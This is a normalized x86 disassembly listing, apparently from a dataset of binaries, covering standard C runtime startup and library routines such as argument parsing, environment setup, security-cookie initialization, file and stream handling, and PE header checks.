add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40927b
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40927b
pop ecx
test eax eax
je r-xdata
call sub_40927b
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_406fcd
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_404a05
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_406e33
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40522f
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_406e33
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_407088
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_40522f
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4020da
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_40711f
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_405274
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_405274
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_407364
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40738a
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_4073b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_407453
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_4083d1
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_402dd3
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_402df9
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_4074d8
push 0x14
push r--data
call sub_402ff0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402d81
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_403035
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_40843a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407453
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4075b8
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_4075c2
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_40522f
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40760b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_402dd3
mov [ eax ] 0x9
call sub_402dd3
mov [ eax ] 0x9
call sub_402d81
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_407661
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40769a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40233b
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_402dd3
push 0x16
pop esi
mov [ eax ] esi
call sub_402d81
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_402dd3
mov [ eax ] 0x2a
call sub_402dd3
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_402dd3
push 0x22
pop esi
mov [ eax ] esi
call sub_402d81
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_405780
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_405780
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_407810
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4078a5
push 0x10
push r--data
call sub_402ff0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_4042ca
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407938
mov eax [ ebp - 0x1c ]
call sub_403035
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_402480
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_4020da
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_407950
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_407990
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4079e0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_403050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_407950
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_407990
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407aa0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407ac0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4020cb
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_407b05
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_407b05
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_407ac0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_407bb5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_407bd4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_407bb5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_407c3f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_407c83
push 0x20
push r--data
call sub_402ff0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_404e93
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_403035
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_407c3f
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_4035e9
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4042ca
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_404d5c
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407dea
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_407e35
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_404d5c
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4020cb
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
